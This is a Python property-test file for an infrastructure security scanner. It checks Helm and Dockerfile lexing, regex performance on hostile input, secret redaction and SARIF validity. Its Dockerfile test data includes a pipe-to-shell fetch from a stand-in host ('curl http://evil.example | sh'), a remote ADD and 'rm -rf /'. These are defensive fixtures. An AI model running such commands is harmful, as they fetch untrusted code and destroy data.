"""Property tests over the code that reads hostile input and the output others parse.

Hypothesis runs with ``derandomize=True`` and a small example count, so a failure reproduces from
the code alone and the suite is quick on a slow machine.
``THREATCODE_PROPERTY_EXAMPLES`` raises the count for a deeper local run.

* The Helm fallback tokenizer reads a template in one pass: it never raises, never emits more text
  than it was given, and does a number of regex steps proportional to the input.
* The Dockerfile lexer never emits an instruction from inside a heredoc body.
* The preview of a secret is a function of the rule and the length only, and no four character
  piece of the secret is in it; the secret is in no output format of a scan.
* ``ir.addressing.base_address`` is idempotent.
* SARIF output validates against the SARIF 2.1.0 schema for random small graphs.

The properties of JSONC stripping and redaction live in ``tests/hostile/test_properties.py``.
"""

from __future__ import annotations

import json
import os
import re
import string
import tempfile
import time
import tracemalloc
from collections.abc import Iterator
from contextlib import contextmanager
from functools import cache
from pathlib import Path
from typing import Any
from unittest import mock

import jsonschema
import pytest
from hypothesis import HealthCheck, example, given, settings
from hypothesis import strategies as st

from threatcode.engine.hybrid import HybridEngine
from threatcode.engine.secrets.scanner import SecretScanner, redact
from threatcode.formatters import RenderOptions, render
from threatcode.formatters.sarif import format_sarif
from threatcode.ir.addressing import base_address
from threatcode.ir.graph import InfraGraph
from threatcode.parsers import _dockerfile_lexer, _helm_render
from threatcode.parsers._dockerfile_lexer import lex
from threatcode.parsers.base import ParsedEdge, ParsedOutput, ParsedResource
from threatcode.pipeline import ScanRequest, run_scan

EXAMPLES = int(os.environ.get("THREATCODE_PROPERTY_EXAMPLES", "60"))
FIXED = settings(
    max_examples=EXAMPLES,
    derandomize=True,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.data_too_large],
)
SLOW = settings(
    max_examples=max(EXAMPLES // 3, 15),
    derandomize=True,
    deadline=None,
    suppress_health_check=[HealthCheck.too_slow, HealthCheck.data_too_large],
)

REPO_ROOT = Path(__file__).resolve().parents[1]
SARIF_SCHEMA = REPO_ROOT / "tests" / "fixtures" / "schemas" / "sarif-schema-2.1.0.json"


# ---------------------------------------------------------------------------------------
# The Helm fallback tokenizer
# ---------------------------------------------------------------------------------------

# Every character that changes what the scanner does: actions, strings, raw strings, comments,
# trim markers, newlines
_brace_soup = st.text(alphabet=list('{}"`-/* \n\\x'), max_size=300)
_template_pieces = st.lists(
    st.sampled_from(
        [
            "{{",
            "}}",
            "{{-",
            "-}}",
            '{{ "',
            '" }}',
            "{{`",
            "`}}",
            "{{/*",
            "*/}}",
            "{{ .Values.x }}",
            "{{ if .Values.x }}",
            "{{ end }}",
            '{{ "}}" }}',
            "\n",
            " ",
            "text",
        ]
    ),
    max_size=60,
).map("".join)


class _Counting:
    """Stand-in for a compiled pattern that counts how often the scanner calls it."""

    def __init__(self, pattern: re.Pattern[str]) -> None:
        self._pattern = pattern
        self.calls = 0

    def search(self, *args: Any) -> Any:
        self.calls += 1
        return self._pattern.search(*args)

    def match(self, *args: Any) -> Any:
        self.calls += 1
        return self._pattern.match(*args)


@contextmanager
def _counted_patterns() -> Iterator[tuple[_Counting, _Counting]]:
    special = _Counting(_helm_render._SPECIAL)
    string_ = _Counting(_helm_render._STRING)
    with (
        mock.patch.object(_helm_render, "_SPECIAL", special),
        mock.patch.object(_helm_render, "_STRING", string_),
    ):
        yield special, string_


class TestHelmTokenizer:
    @FIXED
    @given(st.one_of(_brace_soup, _template_pieces))
    @example("{{" * 40)
    @example('{{ "' * 40)
    @example("{{`" * 40)
    @example("{{/*" * 40 + "}}")
    @example("}}" * 40)
    @example("{{-" * 40 + "-}}")
    def test_it_never_raises_and_never_emits_more_than_it_was_given(self, source: str) -> None:
        tokens = _helm_render.tokenize(source)
        assert sum(len(t.text) for t in tokens) <= len(source)
        lines = [t.line for t in tokens]
        assert lines == sorted(lines)
        assert all(line >= 1 for line in lines)
        assert all(t.kind in ("text", "action") for t in tokens)

    @FIXED
    @given(st.one_of(_brace_soup, _template_pieces))
    def test_it_makes_a_number_of_regex_steps_proportional_to_the_input(self, source: str) -> None:
        """Each step moves the scan forward at least one character, so the count is linear."""
        with _counted_patterns() as (special, string_):
            _helm_render.tokenize(source)
        assert special.calls <= len(source) + 2
        assert string_.calls <= len(source) // 2 + 2

    @FIXED
    @given(
        st.lists(
            st.tuples(
                st.text(alphabet=list("ab \n"), max_size=12),
                st.text(alphabet=list("xy ."), min_size=1, max_size=8),
            ),
            max_size=12,
        ),
        st.text(alphabet=list("ab \n"), max_size=12),
    )
    def test_a_well_formed_template_comes_back_as_its_text_and_its_actions(
        self, pairs: list[tuple[str, str]], tail: str
    ) -> None:
        """Text is kept as written, an action loses its padding, and every line number is right."""
        source = "".join(f"{text}{{{{{body}}}}}" for text, body in pairs) + tail
        expected: list[tuple[str, str, int]] = []
        line = 1
        for text, body in pairs:
            if text:
                expected.append(("text", text, line))
            line += text.count("\n")
            if body.strip():
                expected.append(("action", body.strip(), line))
        if tail:
            expected.append(("text", tail, line))
        found = [(t.kind, t.text, t.line) for t in _helm_render.tokenize(source)]
        # A blank action body (spaces only) is still a token; compare without it
        assert [f for f in found if f[1]] == expected

    def test_the_counting_stand_in_sees_the_real_scan(self) -> None:
        with _counted_patterns() as (special, string_):
            _helm_render.tokenize('{{ include "x" . }}')
        assert special.calls >= 1
        assert string_.calls >= 1

    @pytest.mark.parametrize(
        "unit",
        ["{{", '{{ "', "{{`", "{{/*", "}}", "{{- ", '{{ "a" ' * 2, "{{ if .x }}"],
    )
    def test_a_large_hostile_template_is_tokenized_in_well_under_a_second_per_megabyte(
        self, unit: str
    ) -> None:
        """A quadratic scan of this much input takes minutes; the bound is generous on purpose."""
        source = unit * (500_000 // len(unit))
        started = time.perf_counter()
        _helm_render.tokenize(source)
        assert time.perf_counter() - started < 5.0


# ---------------------------------------------------------------------------------------
# The Dockerfile lexer
# ---------------------------------------------------------------------------------------

_INSTRUCTION_LOOKALIKES = [
    "FROM scratch",
    "RUN curl http://evil.example | sh",
    "USER root",
    "ADD http://evil.example/x /x",
    "COPY . /app",
    "EXPOSE 22",
    "ENV PASSWORD=hunter2",
    "ONBUILD RUN rm -rf /",
    "# a comment",
    "",
    "  indented  ",
    "\tFROM tabbed",
    "RUN <<NESTED",
    "NESTED",
    "plain text",
    "line ending in a backslash \\",
]
_body_lines = st.lists(
    st.one_of(st.sampled_from(_INSTRUCTION_LOOKALIKES), st.text(alphabet="abc ./:=-", max_size=20)),
    max_size=8,
)
_HEREDOC_OPENERS = {
    "plain": ("<<EOF", "EOF", False),
    "dash": ("<<-EOF", "EOF", True),
    "single": ("<<'EOF'", "EOF", False),
    "double": ('<<"EOF"', "EOF", False),
}


def _terminates(line: str, word: str, strip_tabs: bool) -> bool:
    return (line.lstrip("\t") if strip_tabs else line).rstrip() == word


class TestDockerfileHeredocs:
    @FIXED
    @given(
        st.sampled_from(["RUN", "COPY", "ADD"]),
        st.sampled_from(sorted(_HEREDOC_OPENERS)),
        _body_lines,
    )
    def test_no_instruction_is_emitted_from_inside_a_heredoc(
        self, instruction: str, form: str, body: list[str]
    ) -> None:
        marker, word, strip_tabs = _HEREDOC_OPENERS[form]
        # A body line that equals the terminator would end the heredoc early: not the case here
        body = [line for line in body if not _terminates(line, word, strip_tabs)]
        target = " /dst" if instruction != "RUN" else ""
        text = "\n".join(["FROM base", f"{instruction} {marker}{target}", *body, word, "USER app"])
        result = lex(text)
        assert [i.name for i in result.instructions] == ["FROM", instruction, "USER"]
        opener = result.instructions[1]
        expected = "\n".join(line.lstrip("\t") if strip_tabs else line for line in body)
        assert opener.heredoc_body == expected
        # The instruction ends on the terminator and the next one starts on the line after it
        assert opener.end_line == 3 + len(body)
        assert result.instructions[2].start_line == 4 + len(body)
        assert result.skipped == []

    @FIXED
    @given(_body_lines, _body_lines)
    def test_two_heredocs_on_one_instruction_swallow_both_bodies(
        self, first: list[str], second: list[str]
    ) -> None:
        first = [line for line in first if line.rstrip() != "ONE"]
        second = [line for line in second if line.rstrip() != "TWO"]
        text = "\n".join(
            ["FROM base", "COPY <<ONE <<TWO /dst", *first, "ONE", *second, "TWO", "USER app"]
        )
        names = [i.name for i in lex(text).instructions]
        assert names == ["FROM", "COPY", "USER"]

    @FIXED
    @given(_body_lines)
    def test_a_heredoc_with_no_terminator_swallows_nothing(self, body: list[str]) -> None:
        """Lines after a marker without a terminator are ordinary lines, as BuildKit reads them."""
        body = [line for line in body if line.rstrip() != "EOF"]
        text = "\n".join(["FROM base", "RUN <<EOF", *body])
        result = lex(text)
        assert result.instructions[0].name == "FROM"
        assert result.instructions[1].name == "RUN"
        assert result.instructions[1].heredoc_body == ""

    def test_the_property_notices_a_lexer_that_ignores_heredocs(self) -> None:
        """Without heredoc handling the body lines become instructions: the check can fail."""
        text = "FROM base\nRUN <<EOF\nUSER root\nADD http://evil.example/x /x\nEOF\nUSER app"
        assert [i.name for i in lex(text).instructions] == ["FROM", "RUN", "USER"]
        with mock.patch("threatcode.parsers._dockerfile_lexer.find_heredocs", return_value=[]):
            names = [i.name for i in lex(text).instructions]
        assert names == ["FROM", "RUN", "USER", "ADD", "USER"]


# ---------------------------------------------------------------------------------------
# The word and string patterns
# ---------------------------------------------------------------------------------------

# The patterns as they were written before the repetitions became runs of characters: one
# alternative per character, which is easy to read and costs about 150 bytes per character in the
# regex engine. They are the specification; the shipped patterns have to find the same words.
_REFERENCE_WORD = re.compile(r"""(?:"(?:[^"\\]|\\.)*"|'[^']*'|\\.|[^\s"'\\])+|["'\\]""", re.DOTALL)
_REFERENCE_SHELL = re.compile(
    r"""
      (?P<space>[ \t]+)
    | (?P<cont>\\\n)
    | (?P<newline>\n)
    | (?P<redir>&>>?)
    | (?P<op>&&|\|\||\|&|\||;|&|\(|\))
    | (?P<word>(?:"(?:[^"\\]|\\.)*"|'[^']*'|\\.|[<>]&[0-9]*-?|[^\s|&;()"'\\])+|["'\\])
    """,
    re.VERBOSE | re.DOTALL,
)
_REFERENCE_STRING = re.compile(r'"(?:[^"\\\n]|\\.)*"')
_shell_soup = st.text(alphabet=list(" \t\n|&;()<>\"'\\a2-1"), max_size=60)


def _peak_megabytes(action: Any) -> float:
    tracemalloc.start()
    try:
        action()
        return tracemalloc.get_traced_memory()[1] / 1e6
    finally:
        tracemalloc.stop()


class TestWordPatterns:
    @FIXED
    @given(_shell_soup)
    @example("2>&1 cmd >&- 'a b' \"c d\" \\ x")
    @example("a>b<c>>&2<<<")
    @example('"open and never closed \\" a')
    def test_the_shell_tokens_are_the_ones_the_per_character_pattern_finds(self, text: str) -> None:
        ours = [(m.lastgroup, m.group()) for m in _dockerfile_lexer._SHELL_RE.finditer(text)]
        reference = [(m.lastgroup, m.group()) for m in _REFERENCE_SHELL.finditer(text)]
        assert ours == reference

    @FIXED
    @given(_shell_soup)
    @example("'it'\"s\" fine\\ x")
    def test_the_words_are_the_ones_the_per_character_pattern_finds(self, text: str) -> None:
        assert _dockerfile_lexer.split_words_raw(text) == _REFERENCE_WORD.findall(text)

    @FIXED
    @given(st.text(alphabet=list('a"\\\n x'), max_size=40))
    def test_the_helm_string_is_the_one_the_per_character_pattern_finds(self, text: str) -> None:
        for start in range(len(text) + 1):
            ours = _helm_render._STRING.match(text, start)
            reference = _REFERENCE_STRING.match(text, start)
            assert (ours.group() if ours else None) == (reference.group() if reference else None)

    @pytest.mark.parametrize("size", [3_000_000])
    def test_one_huge_word_does_not_cost_hundreds_of_megabytes(self, size: int) -> None:
        word = "a" * size
        assert _peak_megabytes(lambda: _dockerfile_lexer.split_words_raw(word)) < 100
        assert _peak_megabytes(lambda: _dockerfile_lexer.shell_pipelines(word)) < 100
        quoted = '"' + word + '"'
        assert _peak_megabytes(lambda: _dockerfile_lexer.split_words_raw(quoted)) < 100

    # Named ids: a 600,000 character value as a test id overflows the Windows environment variable
    # in which pytest keeps the id of the running test
    @pytest.mark.parametrize(
        "text",
        [
            pytest.param('"' + "a\\b" * 200_000, id="double-quote-and-word-escapes"),
            pytest.param("'" + "a" * 600_000, id="single-quote-and-letters"),
            pytest.param('"' + '\\"' * 300_000, id="double-quote-and-escaped-quotes"),
            pytest.param("\\" * 600_000, id="backslashes"),
        ],
    )
    def test_a_quote_that_never_closes_is_not_catastrophic(self, text: str) -> None:
        """An ambiguous loop would try every way to split the run; this ends at once."""
        started = time.perf_counter()
        _dockerfile_lexer.split_words_raw(text)
        _dockerfile_lexer.shell_pipelines(text)
        assert time.perf_counter() - started < 5.0


# ---------------------------------------------------------------------------------------
# The preview of a secret
# ---------------------------------------------------------------------------------------

# A GitHub token: the provider pattern accepts any 36 or more letters and digits after the
# prefix. Lowercase and digits only, so the secret shares no four character piece with the
# preview, whose letters are upper case apart from "len".
_token_tails = st.text(alphabet=string.ascii_lowercase + string.digits, min_size=36, max_size=80)


@cache
def _scanner() -> SecretScanner:
    return SecretScanner()


def _four_char_pieces(text: str) -> Iterator[str]:
    for start in range(len(text) - 3):
        yield text[start : start + 4]


class TestSecretPreview:
    @FIXED
    @given(_token_tails)
    def test_the_preview_holds_no_four_characters_of_the_secret(self, tail: str) -> None:
        secret = f"ghp_{tail}"
        text = f'resource "aws_lambda_function" "f" {{\n  token = "{secret}"\n}}\n'
        matches = _scanner().scan_text(text, path="main.tf").matches
        assert len(matches) == 1
        match = matches[0]
        assert match.value == secret
        for piece in _four_char_pieces(secret):
            assert piece not in match.preview
        # The repr names the rule, whose keywords ("ghp_") are not the secret, so look for the
        # characters that are only in the secret
        assert tail[:12] not in repr(match)
        assert secret not in match.masked_line

    @FIXED
    @given(_token_tails, _token_tails)
    def test_the_preview_depends_on_the_rule_and_the_length_only(self, one: str, two: str) -> None:
        """Two secrets of one length that one rule matches get the same preview."""
        length = min(len(one), len(two))
        found = []
        for tail in (one[:length], two[:length]):
            text = f'token = "ghp_{tail}"\n'
            matches = _scanner().scan_text(text, path="main.tf").matches
            assert len(matches) == 1
            found.append(matches[0])
        for match in found:
            assert match.preview == redact(match.rule.id, match.length)
            assert match.length == length + 4
        if found[0].rule.id == found[1].rule.id:
            assert found[0].preview == found[1].preview

    @SLOW
    @given(_token_tails)
    def test_the_secret_is_in_no_output_format_of_a_scan(self, tail: str) -> None:
        secret = f"ghp_{tail}"
        text = (
            'resource "aws_lambda_function" "f" {\n'
            '  function_name = "f"\n'
            f'  environment {{ variables = {{ GITHUB_TOKEN = "{secret}" }} }}\n'
            "}\n"
        )
        with tempfile.TemporaryDirectory(prefix="threatcode-property-") as directory:
            path = Path(directory) / "main.tf"
            path.write_text(text, encoding="utf-8")
            result = run_scan(ScanRequest(paths=(str(path),), no_timestamp=True))
            assert any(t.rule_id.startswith("SECRET_") for t in result.report.threats)
            for fmt in ("json", "sarif", "markdown", "text", "bitbucket"):
                output = render(fmt, result.analysis, RenderOptions())
                # A window of the secret, not four characters: ordinary words in a report
                # (names, titles) contain four lowercase letters by chance
                assert secret not in output, fmt
                for start in range(0, len(secret) - 11, 4):
                    assert secret[start : start + 12] not in output, (fmt, start)


# ---------------------------------------------------------------------------------------
# Address arithmetic
# ---------------------------------------------------------------------------------------

_address_text = st.text(alphabet=list("abz09_.-[]\"'\\ "), max_size=40)


class TestBaseAddress:
    @FIXED
    @given(_address_text)
    @example('a[b"][c]')
    @example("[[1]]")
    @example("a['x]'][1]")
    @example("a[1][")
    @example('module.a[0].module.b["x.y"].aws_vpc.main[3]')
    def test_it_is_idempotent(self, address: str) -> None:
        once = base_address(address)
        assert base_address(once) == once

    @FIXED
    @given(_address_text)
    def test_it_never_grows_an_address_and_leaves_one_without_brackets_alone(
        self, address: str
    ) -> None:
        result = base_address(address)
        assert len(result) <= len(address)
        if "[" not in address:
            assert result == address

    @pytest.mark.parametrize(
        ("address", "expected"),
        [
            ("aws_instance.app[0]", "aws_instance.app"),
            ('aws_s3_bucket.logs["eu west"]', "aws_s3_bucket.logs"),
            ('module.net[0].aws_subnet.a["x.y"]', "module.net.aws_subnet.a"),
            ("aws_vpc.main", "aws_vpc.main"),
            ("aws_vpc.main[", "aws_vpc.main["),
        ],
    )
    def test_known_addresses(self, address: str, expected: str) -> None:
        assert base_address(address) == expected


# ---------------------------------------------------------------------------------------
# SARIF for random small graphs
# ---------------------------------------------------------------------------------------

# Resource types and property choices that make rules fire, plus noise
_RESOURCE_SHAPES: dict[str, list[dict[str, Any]]] = {
    "aws_s3_bucket": [{"acl": "public-read"}, {"acl": "private"}, {"bucket": "b"}],
    "aws_security_group": [
        {
            "ingress": [
                {"from_port": 22, "to_port": 22, "protocol": "tcp", "cidr_blocks": ["0.0.0.0/0"]}
            ]
        },
        {"ingress": []},
    ],
    "aws_db_instance": [{"publicly_accessible": True, "storage_encrypted": False}, {}],
    "aws_iam_role": [{"name": "r"}, {"assume_role_policy": "{}"}],
    "aws_instance": [{"associate_public_ip_address": True}, {"ami": "ami-1"}],
    "aws_lb": [{"internal": False}, {"internal": True}],
    "kubernetes_deployment": [{"privileged": True, "host_network": True}, {"replicas": 2}],
    "kubernetes_service": [{"service_type": "LoadBalancer"}, {"service_type": "ClusterIP"}],
    "dockerfile_image": [{"is_root_user": True, "uses_latest_tag": True}, {"has_user": True}],
    "mcp_server": [{"uses_plaintext_transport": True, "is_remote": True}, {"transport": "stdio"}],
    "azurerm_storage_account": [{"allow_nested_items_to_be_public": True}, {}],
    "google_storage_bucket": [{"uniform_bucket_level_access": False}, {}],
}
_noise = st.dictionaries(
    st.sampled_from(["tags", "note", "count", "description", "flag"]),
    st.one_of(st.none(), st.booleans(), st.integers(-5, 5), st.text(max_size=12)),
    max_size=3,
)
_names = st.text(alphabet=string.ascii_letters + string.digits + "_-", min_size=1, max_size=10)
_EDGE_TYPES = ["dependency", "containment", "network_flow", "iam_binding", "data_flow"]


@st.composite
def _graphs(draw: st.DrawFn) -> InfraGraph:
    count = draw(st.integers(0, 6))
    resources: list[ParsedResource] = []
    seen: set[str] = set()
    for _ in range(count):
        resource_type = draw(st.sampled_from(sorted(_RESOURCE_SHAPES)))
        name = draw(_names)
        address = f"{resource_type}.{name}"
        if address in seen:
            continue
        seen.add(address)
        properties = {**draw(st.sampled_from(_RESOURCE_SHAPES[resource_type])), **draw(_noise)}
        located = draw(st.booleans())
        resources.append(
            ParsedResource(
                resource_type=resource_type,
                address=address,
                name=name,
                provider=resource_type.split("_")[0],
                properties=properties,
                source_location=draw(st.sampled_from(["main.tf", "dir/sub.tf", "a b/c.yaml"])),
                start_line=draw(st.integers(1, 500)) if located else None,
            )
        )
    addresses = [r.address for r in resources]
    edges: list[ParsedEdge] = []
    if len(addresses) >= 2:
        for _ in range(draw(st.integers(0, 6))):
            source, target = draw(st.sampled_from(addresses)), draw(st.sampled_from(addresses))
            if source != target:
                edges.append(
                    ParsedEdge(source, target, draw(st.sampled_from(_EDGE_TYPES)), declared=False)
                )
    return InfraGraph.from_parsed(
        ParsedOutput(resources=resources, edges=edges, source_path="main.tf", format_type="x")
    )


@cache
def _sarif_validator() -> Any:
    schema = json.loads(SARIF_SCHEMA.read_text(encoding="utf-8"))
    return jsonschema.Draft4Validator(schema)


@cache
def _engine() -> HybridEngine:
    return HybridEngine()


class TestSarif:
    @SLOW
    @given(_graphs())
    def test_the_output_validates_against_the_sarif_schema(self, graph: InfraGraph) -> None:
        report = _engine().analyze(graph, input_file="main.tf")
        document = json.loads(format_sarif(report, graph))
        errors = sorted(_sarif_validator().iter_errors(document), key=lambda e: list(e.path))
        assert not errors, [f"{list(e.path)}: {e.message[:120]}" for e in errors[:3]]
        assert document["version"] == "2.1.0"
        results = document["runs"][0]["results"]
        assert len(results) >= len(report.threats)

    @SLOW
    @given(_graphs())
    def test_every_result_names_a_rule_the_run_defines(self, graph: InfraGraph) -> None:
        report = _engine().analyze(graph, input_file="main.tf")
        run = json.loads(format_sarif(report, graph))["runs"][0]
        defined = {rule["id"] for rule in run["tool"]["driver"]["rules"]}
        assert {result["ruleId"] for result in run["results"]} <= defined

    def test_the_validator_rejects_a_broken_document(self) -> None:
        graph = InfraGraph.from_parsed(
            ParsedOutput(
                resources=[
                    ParsedResource(
                        resource_type="aws_s3_bucket",
                        address="aws_s3_bucket.b",
                        name="b",
                        provider="aws",
                        properties={"acl": "public-read"},
                        source_location="main.tf",
                        start_line=3,
                    )
                ],
                source_path="main.tf",
                format_type="x",
            )
        )
        report = _engine().analyze(graph, input_file="main.tf")
        document = json.loads(format_sarif(report, graph))
        assert not list(_sarif_validator().iter_errors(document))
        del document["version"]
        document["runs"][0]["results"][0]["level"] = "catastrophic"
        assert len(list(_sarif_validator().iter_errors(document))) >= 2

    def test_the_generator_makes_graphs_that_fire_rules(self) -> None:
        """A strategy that never produced a finding would make the properties above vacuous."""
        graph = InfraGraph.from_parsed(
            ParsedOutput(
                resources=[
                    ParsedResource(
                        resource_type="aws_s3_bucket",
                        address="aws_s3_bucket.b",
                        name="b",
                        provider="aws",
                        properties={"acl": "public-read"},
                        source_location="main.tf",
                        start_line=3,
                    )
                ],
                source_path="main.tf",
                format_type="x",
            )
        )
        assert _engine().analyze(graph, input_file="main.tf").threats
